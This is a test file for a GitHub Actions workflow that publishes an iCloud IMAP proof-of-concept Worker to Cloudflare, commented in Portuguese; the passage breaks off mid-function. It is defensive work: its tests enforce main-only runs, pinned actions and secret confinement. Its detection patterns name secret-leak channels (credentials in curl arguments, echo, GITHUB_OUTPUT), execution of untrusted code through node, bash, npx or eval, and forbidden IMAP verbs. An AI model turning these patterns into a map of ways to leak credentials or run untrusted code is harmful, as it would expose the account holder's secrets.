// RAC Inbox · POC autenticada iCloud — DESENHO B: o workflow privilegiado vive só na main e trata o commit da POC como DADO.
// Sem rede e sem credencial. Parte dos testes lê o texto do workflow; a outra EXECUTA de verdade os passos que não precisam de rede
// (guarda da entrada, montagem do pacote, reconstituição com conferência de hash) para provar que entradas adulteradas são recusadas.
// A fronteira contra quem controla uma branch é a configuração do GitHub (Environments só da main) somada a este arquivo existir só na main.
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";

const raiz = new URL("../", import.meta.url);
const ler = (a) => fs.readFileSync(new URL(a, raiz), "utf8");
const existe = (a) => fs.existsSync(new URL(a, raiz));
const semComentarios = (t) => t.replace(/^\s*#.*$/gm, "").replace(/\s+#\s.*$/gm, "");
const WFTXT = ler(".github/workflows/icloud-auth-probe.yml");
const WF = semComentarios(WFTXT);
const tem = (c) => spawnSync(c, ["--version"]).status === 0;
const semFerramentas = tem("bash") && tem("jq") && tem("git") && tem("sha256sum") && tem("base64") ? false : "bash, jq, git, sha256sum ou base64 não encontrados";

function jobs() {
  const marcas = [...WF.matchAll(/^  (verificar|provisionar|executar):\s*$/gm)].map((m) => ({ nome: m[1], i: m.index }));
  const out = {};
  marcas.forEach((x, k) => { out[x.nome] = WF.slice(x.i, k + 1 < marcas.length ? marcas[k + 1].i : WF.length); });
  return out;
}
const passosDe = (job) => { const m = [...job.matchAll(/^      - /gm)].map((x) => x.index); return m.map((i, k) => job.slice(i, k + 1 < m.length ? m[k + 1] : job.length)); };
const nomeDe = (p) => (/- name: (.+)/.exec(p) || [, ""])[1].trim();
const J = jobs();
const PV = passosDe(J.verificar), PP = passosDe(J.provisionar), PE = passosDe(J.executar);
const comSecret = (p) => /\$\{\{\s*secrets\./.test(p);
function script(passo) { // o bloco "run: |" do passo, sem a indentação do YAML
  const m = /\n        run: \|\n((?:          .*\n|\s*\n)+)/.exec(passo.endsWith("\n") ? passo : passo + "\n");
  assert.ok(m, "passo sem bloco run: " + nomeDe(passo));
  return m[1].replace(/^ {10}/gm, "");
}
const achar = (lista, prefixo) => lista.find((p) => nomeDe(p).startsWith(prefixo));
const SHA_CHECKOUT = "11d5960a326750d5838078e36cf38b85af677262";
const SHA_NODE = "49933ea5288caeca8642d1e84afbd3f7d6820020";

// ---------- estrutura e fronteiras de confiança ----------

test("só dispara na mão, com duas entradas (o commit da POC e a operação, uma lista fechada) e sem permissões por padrão", () => {
  assert.match(WF, /^on:\s*\n\s+workflow_dispatch:\s*\n\s+inputs:\s*\n\s+commit:\s*\n(?:\s+(?:description|required|type): .+\n)+/m);
  assert.deepEqual([...WF.matchAll(/^      (\w+):\s*$/gm)].map((m) => m[1]).filter((n) => ["commit", "operacao"].includes(n)), ["commit", "operacao"]);
  assert.match(WF, /required: true/);
  assert.match(WF, /type: string/);
  const op = /^      operacao:\n((?:        .+\n)+)/m.exec(WF)[1];
  assert.match(op, /default: validar_oidc/, "o padrão é a operação sem efeito e sem credencial");
  assert.match(op, /type: choice/);
  assert.deepEqual([...op.matchAll(/^          - (\w+)$/gm)].map((m) => m[1]), ["validar_oidc", "validar_uso_unico", "p1_imap", "p2_imap"], "lista fechada");
  assert.match(WF, /^      uid_mensagem:\n        description: [^\n]+\n        required: false\n        default: ""\n        type: string\n/m, "a única outra entrada é o UID opcional (texto, vazio por padrão)");
  for (const x of [/\bpush:/, /\bpull_request/, /\bschedule:/, /\bcron:/, /\bworkflow_run:/, /\bworkflow_call:/, /\brepository_dispatch:/])
    assert.ok(!x.test(WF), "gatilho automático não permitido: " + x);
  assert.match(WF, /^permissions: \{\}\s*$/m);
});

test("o workflow privilegiado só roda a partir da main: os três jobs recusam qualquer outra ref e nenhum cita a branch da POC", () => {
  for (const [n, j] of Object.entries(J)) assert.match(j, /\[ "\$GITHUB_REF" != "refs\/heads\/main" \]/, "guarda de ref em " + n);
  assert.equal([...WF.matchAll(/\[ "\$GITHUB_REF" != "refs\/heads\/main" \]/g)].length, 3);
  assert.ok(!/poc\/icloud-cloudflare-connectivity|refs\/heads\/poc/.test(WF), "o workflow não depende do nome da branch da POC");
  assert.ok(!/branches?:\s*\[/.test(WF));
});

test("a entrada commit só passa por env e por ref do checkout, e é validada (40 hexadecimais) antes de qualquer uso; nunca colada em script", () => {
  for (const [n, j] of Object.entries(J)) {
    for (const p of passosDe(j).filter((x) => /\n        run: \|/.test(x))) assert.ok(!/\$\{\{/.test(script(p)), n + ": expressão do GitHub dentro de script em " + nomeDe(p));
  }
  const usos = [...WF.matchAll(/inputs\.commit/g)].length;
  assert.equal(usos, 4, "três env COMMIT (guarda, montagem e empacotamento) e uma ref do checkout");
  assert.match(WF, /ref: \$\{\{ inputs\.commit \}\}/);
  assert.equal([...WF.matchAll(/^\s+COMMIT: \$\{\{ inputs\.commit \}\}\s*$/gm)].length, 3);
  assert.ok(nomeDe(PV[0]).startsWith("Só na main e com um commit válido"), "a validação é o primeiro passo");
  assert.ok(!/inputs\./.test(J.provisionar), "o provisionar não usa nenhuma entrada");
  assert.ok(!/inputs\.commit/.test(J.executar), "só o job verificar usa o commit");
  // a operação só aparece em condições `if:` (nunca em script nem em env), onde é uma comparação com valor fixo da lista fechada
  const usosOp = [...WF.matchAll(/inputs\.operacao/g)].length;
  const emIf = [...WF.matchAll(/^        if: \$\{\{ inputs\.operacao == '(validar_uso_unico|p1_imap|p2_imap)' \}\}\s*$/gm)].length;
  assert.equal(usosOp, 3);
  assert.equal(emIf, 3);
  assert.equal([...WF.matchAll(/inputs\.uid_mensagem/g)].length, 1, "o UID só entra por env do passo da P2");
});

test("o commit da POC é só dado: baixado à parte, em pasta própria, e nada dela é executado", () => {
  const checkouts = [...WF.matchAll(/uses: actions\/checkout@([0-9a-f]{40})\n\s+with:\n((?:\s{10}.+\n)+)/g)].map((m) => m[2]);
  assert.equal(checkouts.length, 3, "main no verificar, POC como dado no verificar, main no provisionar");
  for (const c of checkouts) assert.match(c, /persist-credentials: false/);
  const poc = checkouts.filter((c) => /ref: /.test(c));
  assert.equal(poc.length, 1);
  assert.match(poc[0], /path: poc/);
  assert.match(poc[0], /sparse-checkout: \|\n\s+\/experimentos\/icloud-auth-probe\/\n\s+sparse-checkout-cone-mode: false/);
  for (const c of checkouts.filter((c) => !/ref: /.test(c))) assert.match(c, /sparse-checkout: \|\n\s+\/experimentos\/icloud-auth-probe-ferramenta\/\n\s+sparse-checkout-cone-mode: false/, "da main só os dados da ferramenta");
  // nada da pasta poc é executado
  const scripts = PV.map((p) => (/\n        run: \|/.test(p) ? script(p) : "")).join("\n");
  for (const linha of scripts.split("\n").filter((l) => /\bpoc\b/.test(l) && !/^\s*#/.test(l))) {
    assert.ok(!/(?:^|[\s;&|(])(?:node|bash|sh|npm|npx|npm ci|python3?|source|eval|exec|make|\.)\s+[^\n]*\bpoc\//.test(linha), "execução de algo da pasta poc: " + linha.trim());
    assert.ok(!/\$\(\s*(?:\.|source)\s|\.\/poc|bash poc|node poc/.test(linha), linha.trim());
  }
  for (const j of [J.provisionar, J.executar]) assert.ok(!/(?:^|[\s"'=])poc\//.test(j) && !/path: poc/.test(j) , "o job com secrets e o job OIDC nem citam a pasta da POC");
  assert.ok(!/node --test|\btests\//.test(WF), "nenhum teste do código da POC roda neste workflow (o CI da PR da POC faz isso)");
  assert.ok(!/\bnpm (?:i|install|run|exec|test)\b|\bnpx\b/.test(WF));
});

test("secrets da Cloudflare só existem em dois passos do job provisionar, que não executa nada vindo da branch", () => {
  assert.ok(!/\bsecrets\./.test(J.verificar), "o verificar não tem secrets");
  assert.ok(!/CLOUDFLARE_/.test(J.executar), "o executar não recebe credencial Cloudflare");
  assert.ok(!/secrets\./.test(J.provisionar.split(/^    steps:/m)[0]), "nenhum secret no cabeçalho do job");
  assert.ok(!/secrets\./.test(WF.split(/^jobs:/m)[0]), "nenhum secret no nível do workflow");
  const com = PP.filter(comSecret);
  assert.deepEqual(com.map(nomeDe), ["Conferir o token Cloudflare (sem mostrar dados da conta)", "Publicar o pacote aprovado (Workers Free)"]);
  for (const p of com) {
    const env = /\n        env:\n((?:          .+\n)+)/.exec(p);
    assert.ok(env);
    assert.deepEqual([...env[1].matchAll(/^          (\w+): /gm)].map((m) => m[1]).sort(), ["CLOUDFLARE_ACCOUNT_ID", "CLOUDFLARE_API_TOKEN"]);
  }
  assert.ok(comSecret(PP.at(-1)) && comSecret(PP.at(-2)) && nomeDe(PP.at(-1)).startsWith("Publicar"), "os dois últimos passos, sendo a publicação o último");
  const [token, publicar] = com;
  assert.ok(/\bcurl\b/.test(token) && !/\bnode\b|\bnpm\b|wrangler/.test(token), "a conferência do token só usa curl e jq");
  assert.match(token, /-K <\(printf 'header = "Authorization: Bearer %s"\\n' "\$CLOUDFLARE_API_TOKEN"\)/);
  assert.ok(!/Authorization: Bearer \$CLOUDFLARE_API_TOKEN/.test(token));
  assert.match(publicar, /cd "\$RUNNER_TEMP\/publicar"/);
  assert.match(publicar, /node "\$GITHUB_WORKSPACE\/experimentos\/icloud-auth-probe-ferramenta\/node_modules\/wrangler\/bin\/wrangler\.js" deploy --config "\$RUNNER_TEMP\/publicar\/wrangler\.publicar\.jsonc"/);
  assert.ok(!/--dry-run/.test(publicar) && !/secret put|\bnpx\b/.test(publicar));
  assert.ok(!/(?:^|\s)-x\b|set -x/.test(WF), "sem set -x");
  assert.match(J.provisionar, /NPM_CONFIG_IGNORE_SCRIPTS: "true"/);
  for (const linha of J.provisionar.split("\n").filter((l) => /\bnode\b/.test(l) && !/node-version|^\s*-?\s*uses:/.test(l))) assert.match(linha, /wrangler\/bin\/wrangler\.js/, "o único uso de node é o Wrangler do lockfile");
});

test("job executar: Environment icloud-auth-poc, id-token só aqui, sem actions, checkout, Wrangler nem credencial Cloudflare", () => {
  assert.match(J.executar, /^    environment: icloud-auth-poc\s*$/m);
  assert.match(J.executar, /^    needs: provisionar\s*$/m);
  assert.match(J.executar, /^    permissions:\n      id-token: write\n    env:/m);
  assert.equal([...WF.matchAll(/id-token:\s*write/g)].length, 1);
  assert.ok(!/CLOUDFLARE_(?:API_TOKEN|ACCOUNT_ID)|wrangler|\buses:|checkout|contents:|\bnpm\b|\bnpx\b/i.test(J.executar));
  assert.ok(!/\$\{\{/.test(J.executar.replace(/^\s*runs-on:.*$/m, "").replace(/^        if: \$\{\{ inputs\.operacao == '\w+' \}\}\s*$/gm, "").replace(/^          ICLOUD_(?:USER|APP_PASSWORD): \$\{\{ secrets\.ICLOUD_(?:USER|APP_PASSWORD) \}\}\s*$/gm, "").replace(/^          UID_MENSAGEM: \$\{\{ inputs\.uid_mensagem \}\}\s*$/gm, "")), "só as condições if, os secrets Apple (P1 e P2) e o UID da P2 usam expressões");
  assert.match(J.executar, /--data '\{"operacao":"validar_oidc"\}'/);
  assert.match(J.executar, /^      WORKER_URL: https:\/\/rac-icloud-auth-poc\.[a-z0-9-]+\.workers\.dev\s*$/m);
  assert.match(J.executar, /^      AUDIENCIA_PREFIXO: rac-inbox-icloud-poc\s*$/m);
  assert.deepEqual(PE.map(nomeDe).map((n) => n.split(" (")[0].split(" —")[0]), ["Só na main", "Validar o JWT no Worker", "Prova sintética do uso único", "P1 IMAP", "P2 IMAP"]);
  for (const p of PE.slice(1)) {
    const s = script(p);
    assert.ok(!/echo[^\n]*\$\{?(JWT\b|ACTIONS_ID_TOKEN)/.test(s.replace(/echo "::add-mask::\$JWT"/g, "")), nomeDe(p) + ": o token nunca é impresso");
    assert.ok(s.includes('echo "::add-mask::$JWT"'), nomeDe(p) + ": o token é mascarado");
    assert.ok(!/(?:^|\s)-x\b|set -x/.test(s), "sem set -x");
    for (const l of s.split("\n").filter((x) => /\bcurl\b/.test(x))) assert.ok(!/Authorization: Bearer \$/.test(l), "o token vai por substituição de processo, não por argumento: " + l.trim());
  }
  const pre = script(PE[1]);
  assert.ok(pre.indexOf("::add-mask::$JWT") < pre.indexOf('"$WORKER_URL/auth-probe"'));
  assert.match(pre, /unset JWT/);
});

test("pré-checagem: a única chamada com repetição é a sem efeito (validar_oidc); as operações protegidas nunca repetem sozinhas", () => {
  const pre = script(PE[1]), sint = script(PE[2]), p1 = script(PE[3]), p2 = script(PE[4]);
  assert.match(pre, /for TENTATIVA in 1 2 3 4 5; do/);
  assert.match(pre, /--data '\{"operacao":"validar_oidc"\}'/);
  for (const [nome, s] of [["prova sintética", sint], ["P1", p1], ["P2", p2]]) for (const x of [/for TENTATIVA/, /\bwhile\b/, /\buntil\b/, /\bsleep\b/, /--retry/, /\bTENTATIVA\b/]) assert.ok(!x.test(s), nome + ": sem repetição automática: " + x);
});

test("prova sintética do uso único: sem credencial, dez chamadas simultâneas, exatamente uma aceita e nove recusadas, mais o replay do mesmo token e de um token novo", () => {
  const passo = PE[2], s = script(passo);
  assert.match(passo, /^        if: \$\{\{ inputs\.operacao == 'validar_uso_unico' \}\}\s*$/m);
  assert.ok(!comSecret(passo) && !/ICLOUD|senha|usuario|password/i.test(passo), "nenhuma credencial");
  assert.match(s, /N=10/);
  assert.match(s, /chamar "\$D\/c\$I" "\$\{TOKENS\[\$I\]\}" &/);
  assert.match(s, /^wait$/m);
  assert.match(s, /\[ "\$ACEITAS" = "1" \] && \[ "\$REPETIDAS" = "\$\(\(N - 1\)\)" \] && \[ "\$OUTRAS" = "0" \] && \[ "\$R1" = "409" \] && \[ "\$R2" = "409" \]/);
  assert.match(s, /--data '\{"operacao":"validar_uso_unico"\}'/);
  assert.match(s, /audience=\$AUDIENCIA_PREFIXO:validar_uso_unico/);
  assert.match(s, /exit 1\s*$/);
  assert.match(s, /jq -c '\{ok, erro, motivo, detalhe\}'/, "o resumo só mostra campos fixos da resposta");
});

test("P1: uma única chamada, credencial só dos secrets do Environment, por entrada padrão; nunca em argumento, arquivo, artefato, output ou log", () => {
  const passo = PE[3], s = script(passo);
  assert.match(passo, /^        if: \$\{\{ inputs\.operacao == 'p1_imap' \}\}\s*$/m);
  // os secrets Apple só existem neste passo, no env dele, e são exatamente dois
  assert.ok(!PE.slice(0, 3).some((p) => /secrets\./.test(p)), "nenhum outro passo recebe secrets");
  assert.ok(!/UID_MENSAGEM|uid_mensagem/.test(passo), "a P1 não usa o UID");
  const env = /\n        env:\n((?:          .+\n)+)/.exec(passo)[1];
  assert.deepEqual([...env.matchAll(/^          (\w+): \$\{\{ secrets\.(\w+) \}\}$/gm)].map((m) => m[1] + "=" + m[2]), ["ICLOUD_USER=ICLOUD_USER", "ICLOUD_APP_PASSWORD=ICLOUD_APP_PASSWORD"]);
  assert.equal([...env.matchAll(/^          \w+:/gm)].length, 2);
  // exatamente UMA chamada ao Worker
  assert.equal([...s.matchAll(/\$WORKER_URL\/auth-probe/g)].length, 1);
  assert.equal([...s.matchAll(/curl -sS -m 40 -o "\$RESP"/g)].length, 1);
  // a credencial entra no corpo por entrada padrão, lida do ambiente pelo jq (nunca por argumento do jq nem do curl)
  assert.match(s, /jq -n '\{operacao: "p1_imap", usuario: env\.ICLOUD_USER, senha: env\.ICLOUD_APP_PASSWORD\}' \| curl /);
  assert.match(s, /--data-binary @-/);
  for (const l of s.split("\n")) {
    if (/ICLOUD_(?:USER|APP_PASSWORD)/.test(l)) assert.ok(!/\b(?:echo|printf|cat|tee|curl|export|GITHUB_OUTPUT|GITHUB_ENV|GITHUB_STEP_SUMMARY)\b/.test(l) || /^\s*if \[ -z/.test(l) || /::error::/.test(l) || /\| curl/.test(l) || /^\s*unset /.test(l), "credencial em linha suspeita: " + l.trim());
    assert.ok(!/--data(?:-raw|-urlencode)? ['"]?[^@'" ]*\$ICLOUD/.test(l) && !/\$\{?ICLOUD_(?:USER|APP_PASSWORD)\}?.*\bcurl\b|\bcurl\b.*\$\{?ICLOUD_(?:USER|APP_PASSWORD)/.test(l.replace(/\| curl/, "")), "credencial em argumento: " + l.trim());
  }
  assert.ok(!/GITHUB_OUTPUT|GITHUB_ENV|upload-artifact|\bcache@|>>\s*"?\$RUNNER_TEMP|> *"\$RUNNER_TEMP\/[^"]*(?:senha|cred)/.test(s), "nada de output, arquivo ou artefato com a credencial");
  assert.match(s, /unset JWT ICLOUD_USER ICLOUD_APP_PASSWORD/);
  assert.ok(s.indexOf("::add-mask::$JWT") < s.indexOf('"$WORKER_URL/auth-probe"'));
  // segredos ausentes: interrompe só a P1, com instrução e sem pedir valor
  assert.match(s, /if \[ -z "\$ICLOUD_USER" \] \|\| \[ -z "\$ICLOUD_APP_PASSWORD" \]; then[\s\S]*?exit 1/);
  assert.match(s, /nunca no chat/);
  // o resumo só mostra os campos permitidos do esquema fechado
  assert.match(s, /jq '\{ok, operacao, estagio, autenticado, logout, erro, motivo, detalhe, capabilities, pastas, pasta_teste_existe\}'/);
  assert.match(s, /jq -e '\.ok == true and \.autenticado == true'/);
  assert.match(s, /Nenhuma nova tentativa é feita/);
});

test("P2: uma única chamada, mesma credencial só dos secrets do Environment por entrada padrão, UID só por env e validado, resumo só com campos permitidos", () => {
  const passo = PE[4], s = script(passo);
  assert.match(passo, /^        if: \$\{\{ inputs\.operacao == 'p2_imap' \}\}\s*$/m);
  const env = /\n        env:\n((?:          .+\n)+)/.exec(passo)[1];
  assert.deepEqual([...env.matchAll(/^          (\w+): \$\{\{ (secrets|inputs)\.(\w+) \}\}$/gm)].map((m) => m[1] + "=" + m[2] + "." + m[3]), ["ICLOUD_USER=secrets.ICLOUD_USER", "ICLOUD_APP_PASSWORD=secrets.ICLOUD_APP_PASSWORD", "UID_MENSAGEM=inputs.uid_mensagem"]);
  assert.equal([...env.matchAll(/^          \w+:/gm)].length, 3);
  assert.equal([...s.matchAll(/\$WORKER_URL\/auth-probe/g)].length, 1, "exatamente UMA chamada ao Worker");
  assert.equal([...s.matchAll(/curl -sS -m 40 -o "\$RESP"/g)].length, 1);
  assert.match(s, /audience=\$AUDIENCIA_PREFIXO:p2_imap/);
  assert.match(s, /jq -n --arg uid "\$UID_MENSAGEM" '\{operacao: "p2_imap", usuario: env\.ICLOUD_USER, senha: env\.ICLOUD_APP_PASSWORD\} \+ \(if \$uid == "" then \{\} else \{uid: \(\$uid \| tonumber\)\} end\)' \| curl /);
  assert.match(s, /--data-binary @-/);
  assert.match(s, /\[\[ "\$UID_MENSAGEM" =~ \^\[1-9\]\[0-9\]\{0,9\}\$ \]\]/, "o UID é conferido (só dígitos) antes de qualquer uso");
  assert.ok(s.indexOf("UID_MENSAGEM\" =~") < s.indexOf("::add-mask::$JWT"), "o UID é conferido antes de pedir o token");
  assert.ok(!/\$\{?UID_MENSAGEM\}?[^"\n]*\bcurl\b|\bcurl\b[^\n]*\$\{?UID_MENSAGEM/.test(s.replace(/\| curl/g, "")), "o UID não vai a argumento do curl");
  for (const l of s.split("\n")) {
    if (/ICLOUD_(?:USER|APP_PASSWORD)/.test(l)) assert.ok(!/\b(?:echo|printf|cat|tee|curl|export|GITHUB_OUTPUT|GITHUB_ENV|GITHUB_STEP_SUMMARY)\b/.test(l) || /^\s*if \[ -z/.test(l) || /::error::/.test(l) || /\| curl/.test(l) || /^\s*unset /.test(l), "credencial em linha suspeita: " + l.trim());
    assert.ok(!/--data(?:-raw|-urlencode)? ['"]?[^@'" ]*\$ICLOUD/.test(l), "credencial em argumento: " + l.trim());
  }
  assert.ok(!/GITHUB_OUTPUT|GITHUB_ENV|upload-artifact|\bcache@/.test(s) && !/\bCORPO=|=\$\(jq -n[^|]*\)$/.test(s.replace(/CODE=\$\(jq -n/, "")), "a credencial não vai a output, arquivo, artefato nem a variável de shell");
  assert.match(s, /unset JWT ICLOUD_USER ICLOUD_APP_PASSWORD/);
  assert.ok(s.indexOf("::add-mask::$JWT") < s.indexOf('"$WORKER_URL/auth-probe"'));
  assert.match(s, /if \[ -z "\$ICLOUD_USER" \] \|\| \[ -z "\$ICLOUD_APP_PASSWORD" \]; then[\s\S]*?exit 1/);
  assert.match(s, /jq '\{ok, operacao, estagio, autenticado, logout, erro, motivo, detalhe, pasta_teste_existe, somente_leitura_confirmado, mensagens_na_pasta, mensagem\}'/);
  assert.match(s, /jq -e '\.ok == true and \.operacao == "p2_imap" and \.autenticado == true'/);
  assert.match(s, /Nenhuma nova tentativa é feita/);
  assert.ok(!/(?:^|[\s"'=])poc\//.test(s) && !/\bSMTP\b|smtp\./i.test(s), "sem SMTP e sem pasta da POC");
});

test("a credencial Apple nunca é citada fora dos passos da P1 e da P2 (nem nos jobs verificar e provisionar, nem em cabeçalho do workflow)", () => {
  const fora = WF.replace(PE[3], "").replace(PE[4], "").replace(/^      operacao:\n(?:        .+\n)+/m, ""); // a descrição da entrada "operacao" só informa o nome dos secrets
  assert.ok(!/ICLOUD_(?:USER|APP_PASSWORD)\b/.test(fora.replace(/#.*$/gm, "")), "só os passos da P1 e da P2 usam os secrets");
  assert.ok(!/senha|password/i.test(J.verificar) && !/senha|password/i.test(J.provisionar));
});

test("nada sensível passa entre os jobs: só commit, hash e pacote públicos vão de verificar para provisionar; executar não lê nada", () => {
  for (const x of [/upload-artifact/, /download-artifact/, /\bcache@/, /GITHUB_ENV/, /GITHUB_PATH/, /\bartifact/i, /steps\.\w+\.outputs\.(?!commit|sha256|pacote)/])
    assert.ok(!x.test(WF), "mecanismo proibido entre jobs: " + x);
  const saidas = [...J.verificar.matchAll(/^      (\w+): \$\{\{ steps\.empacotar\.outputs\.(\w+) \}\}\s*$/gm)].map((m) => m[1]);
  assert.deepEqual(saidas.sort(), ["commit", "pacote", "sha256"]);
  assert.ok(!/\boutputs:/.test(J.provisionar) && !/\boutputs:/.test(J.executar) && !/GITHUB_OUTPUT/.test(J.provisionar) && !/GITHUB_OUTPUT/.test(J.executar));
  assert.deepEqual([...J.provisionar.matchAll(/needs\.(\w+)\.outputs\.(\w+)/g)].map((m) => m[1] + "." + m[2]).sort(), ["verificar.commit", "verificar.pacote", "verificar.sha256"]);
  assert.ok(!/needs\./.test(J.executar.replace(/^    needs: provisionar\s*$/m, "")));
});

test("actions oficiais fixadas por SHA (conferidos nos repositórios oficiais) e Wrangler só pelo lockfile da main, sem scripts", () => {
  const usos = [...WF.matchAll(/^\s*-?\s*uses:\s*(\S+)/gm)].map((m) => m[1]);
  assert.equal(usos.length, 5);
  for (const u of usos) assert.match(u, /^actions\/(checkout|setup-node)@[0-9a-f]{40}$/, u);
  assert.equal(usos.filter((u) => u === "actions/checkout@" + SHA_CHECKOUT).length, 3);
  assert.equal(usos.filter((u) => u === "actions/setup-node@" + SHA_NODE).length, 2);
  assert.equal([...WFTXT.matchAll(/@[0-9a-f]{40} # v4\.4\.0/g)].length, 5);
  assert.ok(!/\bwrangler@/.test(WF) && !/\bnpx\b/.test(WF));
  assert.equal([...WF.matchAll(/npm ci --prefix "\$FERR" --ignore-scripts --no-audit --no-fund/g)].length, 2);
  const dir = "experimentos/icloud-auth-probe-ferramenta/";
  const pkg = JSON.parse(ler(dir + "package.json")), lock = JSON.parse(ler(dir + "package-lock.json"));
  assert.deepEqual(pkg.dependencies, { wrangler: "4.161.0" });
  assert.ok(!pkg.scripts && pkg.private === true);
  const integr = lock.packages["node_modules/wrangler"].integrity;
  assert.match(integr, /^sha512-[A-Za-z0-9+/=]{80,}$/);
  for (const j of ["verificar", "provisionar"]) assert.ok(J[j].includes('"' + integr + '"'), "integridade conferida em " + j);
  const sem = Object.entries(lock.packages).filter(([k, v]) => k !== "" && (!v.integrity || !/^https:\/\/registry\.npmjs\.org\//.test(v.resolved || ""))).map(([k]) => k);
  assert.deepEqual(sem, []);
  for (const alvo of ["", dir]) assert.ok(!existe(alvo + ".npmrc"));
  assert.deepEqual(fs.readdirSync(new URL(dir, raiz)).sort(), ["README.md", "package-lock.json", "package.json"]);
});

const ARQS_WORKER = ["politica", "jwt", "jwks", "consumo", "imap", "mime", "mensagem", "rotas", "index"];
const CFG_FIXA = { name: "rac-icloud-auth-poc", main: "src/index.mjs", compatibility_date: "2026-11-13", workers_dev: true, observability: { enabled: false },
  durable_objects: { bindings: [{ name: "CONSUMO", class_name: "ConsumoUnico" }] }, migrations: [{ tag: "v1", new_sqlite_classes: ["ConsumoUnico"] }] };

test("integridade do pacote: lista fixa, config única escrita no workflow (com o Durable Object), dry-run, inspeção, sha256 e publicação do mesmo arquivo sem bundle", () => {
  const montar = achar(PV, "Montar o pacote");
  assert.match(montar, /ESPERADO=\$'\.\/README\.md\\n\.\/src\/consumo\.mjs\\n\.\/src\/imap\.mjs\\n\.\/src\/index\.mjs\\n\.\/src\/jwks\.mjs\\n\.\/src\/jwt\.mjs\\n\.\/src\/mensagem\.mjs\\n\.\/src\/mime\.mjs\\n\.\/src\/politica\.mjs\\n\.\/src\/rotas\.mjs\\n\.\/wrangler\.jsonc'/);
  assert.match(montar, /find "\$BASE" -type l/);
  assert.match(montar, /for ARQ in politica jwt jwks consumo imap mime mensagem rotas index; do cp "\$BASE\/src\/\$ARQ\.mjs"/);
  const heredoc = (j) => JSON.parse(new RegExp("<<'JSON'\\n([\\s\\S]*?)\\n\\s*JSON\\n").exec(j)[1].replace(/^\s{10}/gm, ""));
  const cfgV = heredoc(J.verificar), cfgP = heredoc(J.provisionar);
  assert.deepEqual(cfgV, CFG_FIXA, "a configuração fixa do verificar é exatamente esta (Durable Object CONSUMO com SQLite e migração v1; nenhuma outra chave)");
  const { main, ...semMain } = CFG_FIXA;
  assert.deepEqual(cfgP, semMain, "o provisionar usa a mesma configuração, sem main (que vira o arquivo conferido)");
  assert.deepEqual(Object.keys(cfgV).sort(), ["compatibility_date", "durable_objects", "main", "migrations", "name", "observability", "workers_dev"], "nenhuma chave executável, de rota, de variável ou de armazenamento além do Durable Object");
  assert.match(J.provisionar, /jq --arg main "\$DEST\/index\.js" '\. \+ \{main: \$main, no_bundle: true\}'/);
  const emp = achar(PV, "Empacotar");
  assert.match(emp, /deploy --dry-run --outdir/);
  for (const padrao of [String.raw`process\.env`, String.raw`eval\(`, "new Function", String.raw`smtp\.mail\.me\.com`, String.raw`import\(`, String.raw`require\(`, String.raw`console\.`]) assert.ok(emp.includes("'" + padrao + "'"), "inspeção: " + padrao);
  assert.ok(!emp.includes("'cloudflare:'") && !emp.includes(String.raw`'imap\.mail\.me\.com'`), "as proibições totais antigas foram trocadas por listas exatas");
  assert.match(emp, /MODULOS=\$\(grep -oE 'cloudflare:\[a-z\]\+' "\$BUNDLE" \| sort -u\)/);
  assert.match(emp, /"\$MODULOS" != "cloudflare:sockets"/);
  assert.match(emp, /"\$APPLE" != "imap\.mail\.me\.com"/);
  assert.match(emp, /grep -qwE 'EXPUNGE\|APPEND\|STORE\|SEARCH\|RENAME\|SUBSCRIBE\|UNSUBSCRIBE\|AUTHENTICATE\|STARTTLS\|SELECT\|UNSELECT\|COPY\|MOVE\|IDLE\|NOOP\|CLOSE\|STATUS\|ENABLE\|NAMESPACE\|FLAGS'/);
  assert.ok(emp.includes(`grep -qF 'Object.freeze(["CAPABILITY", "LOGIN", "LIST", "LOGOUT"])'`) && emp.includes(`grep -qF 'Object.freeze(["CAPABILITY", "LOGIN", "LIST", "EXAMINE", "FETCH", "UID", "LOGOUT"])'`), "as duas listas de verbos têm de ser exatas");
  assert.ok(emp.includes("grep -qF 'BODY['") && emp.includes("RFC822[A-Za-z.]*"), "nenhuma leitura sem PEEK e nenhum RFC822 além do tamanho");
  assert.match(emp, /"\$HOSTS" != \$'https:\/\/consumo\.interno\\nhttps:\/\/token\.actions\.githubusercontent\.com'/);
  assert.match(emp, /grep -qE '\^var ConsumoUnico = class'/);
  assert.match(emp, /sha256sum "\$BUNDLE"/);
  assert.match(emp, /Antes de aprovar/);
  const rec = achar(PP, "Reconstituir");
  assert.match(rec, /sha256sum -c -/);
  assert.match(rec, /PACOTE_B64: \$\{\{ needs\.verificar\.outputs\.pacote \}\}/);
  assert.match(rec, /SHA256_ESPERADO: \$\{\{ needs\.verificar\.outputs\.sha256 \}\}/);
});

test("um único caminho de publicação privilegiada: nenhum outro workflow usa os Environments com secrets ou o Wrangler com secrets", () => {
  const dir = ".github/workflows/";
  const arquivos = fs.readdirSync(new URL(dir, raiz)).filter((f) => /\.ya?ml$/.test(f));
  assert.ok(!arquivos.includes("icloud-probe-deploy.yml"), "o workflow antigo (npx sem lockfile, configuração da ref) foi retirado");
  const privilegiados = arquivos.filter((f) => /environment:\s*(cloudflare-poc|icloud-auth-poc)|CLOUDFLARE_API_TOKEN/.test(ler(dir + f)));
  assert.deepEqual(privilegiados, ["icloud-auth-probe.yml"]);
});

// ---------- execução real dos passos que não precisam de rede ----------

const TMPS = [];
function tmp() { const d = fs.mkdtempSync(path.join(os.tmpdir(), "rac-wf-")); TMPS.push(d); return d; }
process.on("exit", () => { for (const d of TMPS) fs.rmSync(d, { recursive: true, force: true }); });
const CFG = { $schema: "node_modules/wrangler/config-schema.json", ...CFG_FIXA };
function fixture({ extra = {}, cfg = CFG } = {}) {
  const ws = tmp(), base = path.join(ws, "poc/experimentos/icloud-auth-probe");
  fs.mkdirSync(path.join(base, "src"), { recursive: true });
  fs.writeFileSync(path.join(base, "README.md"), "# poc\n");
  fs.writeFileSync(path.join(base, "wrangler.jsonc"), JSON.stringify(cfg, null, 2));
  for (const n of ARQS_WORKER) fs.writeFileSync(path.join(base, "src", n + ".mjs"), "export const " + n + " = 1;\n");
  for (const [rel, conteudo] of Object.entries(extra)) { fs.mkdirSync(path.dirname(path.join(base, rel)), { recursive: true }); fs.writeFileSync(path.join(base, rel), conteudo); }
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.test", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.test" };
  const g = (...a) => spawnSync("git", ["-C", path.join(ws, "poc"), ...a], { env, encoding: "utf8" });
